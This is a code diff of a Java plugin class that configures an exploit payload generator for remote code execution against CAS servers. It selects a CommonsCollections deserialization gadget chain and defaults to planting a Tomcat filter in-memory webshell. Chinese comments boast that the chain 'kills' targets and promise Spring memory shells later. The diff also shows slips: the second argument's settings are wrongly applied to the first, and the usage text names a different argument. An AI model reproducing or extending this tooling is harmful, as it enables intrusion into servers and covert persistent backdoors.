@@ -18,27 +18,31 @@ public class CasPayloadGenerate implements IPayloadGenerator {
     }
 
     @Override
-    public List<IArgs> getCutomArgs() {
-        final List<IArgs> args = new ArrayList<IArgs>();
-        final IArgs gadge = CasRCE.pluginHelper.createArgs();
+    public IArgsUsageBinder getPayloadCustomArgs() {
+        IArgsUsageBinder binder = CasRCE.callbacks.getPluginHelper().createArgsUsageBinder();
+        List<IArgs> args = new ArrayList<>();
+        final IArgs gadge = CasRCE.callbacks.getPluginHelper().createArgs();
         gadge.setName("gadge");
         gadge.setDefaultValue("CommonsCollections4");
+        gadge.setRequired(true);
         gadge.setDescription("cc链，默认用cc4就能打死");
-        gadge.setMastSetup(true);
-        args.add(gadge);
 
-        final IArgs command = CasRCE.pluginHelper.createArgs();
-        command.setName("command");
-        command.setDefaultValue("advance:TomcatFilterWebshell");
-        command.setDescription("可以使用advance:TomcatFilterWebshell 直接打内存shell");
-        command.setMastSetup(true);
-        args.add(command);
-        return args;
+        final IArgs shellType = CasRCE.callbacks.getPluginHelper().createArgs();
+        shellType.setName("command");
+        shellType.setDefaultValue("TomcatFilterWebshell");
+        gadge.setRequired(true);
+        gadge.setDescription("以后会添加spring的内存马");
+
+        args.add(gadge);
+        args.add(shellType);
+        binder.setArgsList(args);
+        binder.setUsage("gadge=URLDNS\nshell_type=http://www.baidu.com");
+        return binder;
     }
 
     @Override
     public void generatorPayload(Map<String, String> customArgs, IResultOutput result) {
-        this.iResultOutput = result;
+        iResultOutput = result;
         String className = customArgs.get("gadge");
         String command = customArgs.get("command");
         result.rawPrintln("\n\n调用类: "+className+"\ncommand: "+command+"\n");
